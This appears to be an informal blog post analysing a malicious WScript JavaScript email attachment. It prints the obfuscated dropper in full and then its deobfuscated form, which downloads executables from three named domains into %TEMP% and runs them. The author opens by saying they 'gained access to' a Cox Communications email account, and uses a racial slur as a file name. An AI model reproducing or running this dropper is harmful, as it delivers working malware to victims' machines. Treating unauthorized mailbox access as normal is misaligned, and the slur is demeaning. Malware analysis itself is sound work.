<pre>
I gained access to a Cox Communications email, and from there I started to sift through the emails on the accout and found a really obvious
malicious javascript file, using WScript. It was obsfucated and I decided it was the tiniest bit hacker enough for me to write about it. L
ets start off by showing you guys the file.

------------------

var a2 = '555C505E0D101E060D0B080B030D0724070B1C4A0A01105E3C5E0D08080D0B0A050D1601170B070D01101D4A070B095E17555E555051575754505453525E55',
    z3 = 'XMLH',
    c9 = '); ',
    c6 = 'ar w',
    b2 = 'e(fn',
    c4 = 'in',
    k3 = '");',
    s8 = 'tring',
    q9 = 'r i=',
    k9 = 'ript',
    l8 = '{ ',
    v3 = ' > ',
    b6 = 't.S',
    i9 = eval,
    m5 = '.po',
    e0 = 'rnd',
    l1 = ' i;',
    s7 = '/c',
    n0 = '== ',
    j1 = 'xpand',
    e6 = 'gs',
    t2 = 'limo',
    d3 = 'ntStr',
    z9 = 'WSc',
    m4 = 'ToFil',
    e5 = '"11',
    v5 = '%TEMP',
    b5 = '= 0; ',
    l7 = 't.',
    y9 = '"+n',
    g7 = 'ld',
    i8 = 'bjec',
    r6 = '.ope',
    w5 = 'B.',
    o1 = 'm")',
    p8 = 'MSXM',
    j7 = ' =',
    q8 = ' ca',
    n2 = 'xa.',
    j4 = 'n.co',
    u8 = 'ip',
    z1 = '; n<=',
    e1 = 'nme',
    c1 = 'catc',
    s1 = 'va',
    r4 = 'var ',
    y4 = 'n+',
    f9 = 'Run(f',
    s3 = 'ttp:',
    m1 = '}; ',
    f1 = '+b',
    t3 = 'ADOD',
    z5 = ' dn =',
    t0 = '","h',
    y5 = 'e = 1',
    i1 = ' (',
    v0 = ' bre',
    c0 = 'nter',
    t5 = ' 1;',
    x0 = '4042',
    p5 = 'dy)',
    p2 = 't("',
    v2 = '(xo.r',
    t6 = ' ws.E',
    z8 = 'h (er',
    n4 = 'if (x',
    n3 = 'gth; ',
    p3 = ' dn ',
    p7 = 'try',
    t1 = 'viro',
    x3 = '[i]+"',
    g3 = 'xe"',
    c2 = 'eri',
    i4 = 'ateO',
    z0 = 'om pu',
    g4 = '");',
    h1 = 'anga',
    j3 = '+n+',
    k1 = 'fals',
    r1 = '92)+',
    y8 = '("',
    u4 = '; v',
    v6 = '.i',
    q1 = 'o.st',
    o2 = 'espon',
    f8 = 'a.',
    o7 = r4 + 'b =' + ' "' + t2 + 'bi' + 'zso' + 'lu' + 'ti' + 'on.c' + z0 + 'rip' + h1 + j4 + v6 + 'd fir' + c2 + 'sk' + 'cont' + 'rol.c' + 'om' + '".sp' + 'lit("' + ' ")' + u4 + c6 + 's = ' + z9 + k9 + '.Cre' + 'at' + 'eObj' + 'ect("' + 'WScr' + u8 + b6 + 'hell' + g4 + ' var ' + 'fn =' + t6 + j1 + 'En' + t1 + e1 + d3 + c4 + e6 + '("' + v5 + '%")+S' + s8 + '.fro' + 'mCha' + 'rCo' + 'de(' + r1 + e5 + '9049"' + '; var' + ' xo' + ' = W' + 'Scrip' + l7 + 'Creat' + 'eObj' + 'ect' + y8 + p8 + 'L2.' + z3 + 'TTP' + k3 + ' var ' + 'xa' + ' = WS' + 'cript' + '.Cre' + i4 + i8 + p2 + t3 + w5 + 'Strea' + o1 + '; va' + 'r ld' + ' = ' + '0; fo' + 'r (' + s1 + 'r n=1' + z1 + '3; ' + 'n++) ' + '{ fo' + 'r ' + '(va' + q9 + g7 + '; ' + 'i<b.' + 'len' + n3 + 'i++)' + ' {' + ' var' + p3 + b5 + p7 + ' { xo' + r6 + 'n("G' + 'ET' + t0 + s3 + '//"' + f1 + x3 + s7 + 'ou' + c0 + '/?' + 'id=' + '"+' + 'a2+"&' + e0 + '=77' + x0 + y9 + ', ' + k1 + 'e)' + '; xo.' + 'sen' + 'd(); ' + n4 + q1 + 'atus ' + n0 + '200' + ') ' + l8 + n2 + 'open' + '(); x' + 'a.' + 'typ' + y5 + '; x' + f8 + 'wri' + 'te' + v2 + o2 + 'se' + 'Bo' + p5 + '; if' + ' (xa' + '.size' + v3 + '100' + '0) {' + z5 + t5 + ' xa' + m5 + 'sitio' + 'n = ' + '0; xa' + '.sa' + 've' + m4 + b2 + j3 + '".e' + 'xe",2' + '); ' + 'tr' + 'y {' + ' ws.' + f9 + y4 + 'n+' + '".e' + g3 + ',1,0)' + '; } ' + c1 + z8 + ') { ' + '}; ' + m1 + 'xa.cl' + 'ose(' + c9 + '}; i' + 'f ' + '(dn ' + '== 1' + ') {' + ' ld' + j7 + l1 + v0 + 'ak;' + ' }; }' + q8 + 'tch' + i1 + 'er' + ') { }' + '; }' + '; ' + '};';
i9(o7);

----------

That is after being beautified, if you quickly look through it, you find that the var i9 is set to eval().
If you don't know what eval() does, it takes a string of code and runs it. So the var o7 must be a string
of code. So how about instead of evaling the code, we get it to display the code to us.

We'll switch i9(o7); to WScript.Echo(o7); which will give us a message box of the code.
However, we don't want to have to write out the whole thing by hand, so lets write some shit to save the code
into a new file!

-----------

var cocks = WScript.CreateObject("ADODB.Stream");
cocks.open();
cocks.type = 2;
cocks.WriteText(String(o7));
cocks.position = 0;
cocks.saveToFile("niggers.wow.js");
cocks.close();

-----------

This will write the file to "niggers.wow.js". Lets check the file now.
(I also beautified this to make the blog post look nice.)

------------

var b = "limobizsolution.com puripangan.co.id fireriskcontrol.com".split(" ");
var ws = WScript.CreateObject("WScript.Shell");
var fn = ws.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + "119049";
var xo = WScript.CreateObject("MSXML2.XMLHTTP");
var xa = WScript.CreateObject("ADODB.Stream");
var ld = 0;
for (var n = 1; n <= 3; n++) {
    for (var i = ld; i < b.length; i++) {
        var dn = 0;
        try {
            xo.open("GET", "http://" + b[i] + "/counter/?id=" + a2 + "&rnd=774042" + n, false);
            xo.send();
            if (xo.status == 200) {
                xa.open();
                xa.type = 1;
                xa.write(xo.responseBody);
                if (xa.size > 1000) {
                    dn = 1;
                    xa.position = 0;
                    xa.saveToFile(fn + n + ".exe", 2);
                    try {
                        ws.Run(fn + n + ".exe", 1, 0);
                    } catch (er) {};
                };
                xa.close();
            };
            if (dn == 1) {
                ld = i;
                break;
            };
        } catch (er) {};
    };
};


--------------

If you attempt to run it by itself, it actuall requires a variable from the previous file, lets just add it in to the top.

--------------

var a2 = '555C505E0D101E060D0B080B030D0724070B1C4A0A01105E3C5E0D08080D0B0A050D1601170B070D01101D4A070B095E17555E555051575754505453525E55';

---------------

So now have a totally readable javascript file running a for loop through a list of domains (backups for exe?), and downloading
exes from them, and attempting to run them. It seems completely broken on my end so I couldnt retrieve an exe.

But if we comment out ws.Run(fn + n + ".exe", 1, 0); and xa.saveToFile(fn + n + ".exe", 2); and then add WScript.Echo(fn + N + ".exe"); above the saveToFile,
we will get the file it's saving, and if we could get that file (probably some skiddy vb.net garbage) we could reverse that and attempt to look
inside the almighty botnet!

THE HOUSE ALWAYS WINS
THANKS FOR READING.

</pre>